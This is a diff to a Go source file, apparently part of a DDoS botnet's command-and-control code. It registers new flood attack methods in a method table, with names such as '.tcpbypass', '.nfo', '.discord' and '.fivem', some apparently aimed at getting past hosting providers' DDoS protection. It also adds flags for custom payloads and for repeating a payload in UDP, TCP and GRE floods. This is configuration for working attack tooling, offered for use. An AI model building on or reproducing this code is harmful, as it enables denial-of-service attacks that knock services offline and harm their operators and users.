@@ -137,6 +137,22 @@ var Flags map[string]Flag = map[string]Flag{
 		ID:          26,
 		Description: "Random length",
 	},
+	"minlen": {
+		ID:          27,
+		Description: "Minimum length",
+	},
+	"maxlen": {
+		ID:          28,
+		Description: "Maximum length",
+	},
+	"payload": {
+		ID:          29,
+		Description: "Custom payload",
+	},
+	"repeat": {
+		ID:          30,
+		Description: "How many times to repeat custom payload in packet (for UDP, TCP, and GRE floods)",
+	},
 }
 
 // Holds all the methods which are valid
@@ -188,21 +204,25 @@ var Methods map[string]*Method = map[string]*Method{
 		Flags:       []uint8{0, 1, 7},
 		Description: "",
 	},
+
 	".tcpsocket": {
 		Type:        8,
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
 		Description: "",
 	},
+
 	".tcpstream": {
 		Type:        9,
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
 		Description: "",
 	},
+
 	".tcpwra": {
 		Type:        10,
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
 		Description: "",
 	},
+
 	".ovh": {
 		Type:        11,
 		Flags:       []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
@@ -219,6 +239,42 @@ var Methods map[string]*Method = map[string]*Method{
 		Type:        13,
 		Flags:       []uint8{8, 7, 20, 21, 22, 24},
 		Description: "HTTP flood",
+	},
+
+	".tcpbypass": {
+		Type:        14,
+		Flags:       []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
+		Description: "",
+	},
+
+	".nfo": {
+		Type:        15,
+		Flags:       []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
+		Description: "",
+	},
+
+	".udpplain": {
+		Type:        16,
+		Flags:       []uint8{0, 1, 7},
+		Description: "",
+	},
+
+	".game": {
+		Type:        17,
+		Flags:       []uint8{8, 7, 20, 21, 22, 24},
+		Description: "",
+	},
+
+	".discord": {
+		Type:        18,
+		Flags:       []uint8{0, 6, 7},
+		Description: "",
+	},
+
+	".fivem": {
+		Type:        19,
+		Flags:       []uint8{0, 1, 7, 8, 30},
+		Description: "",
 	},
 }
 
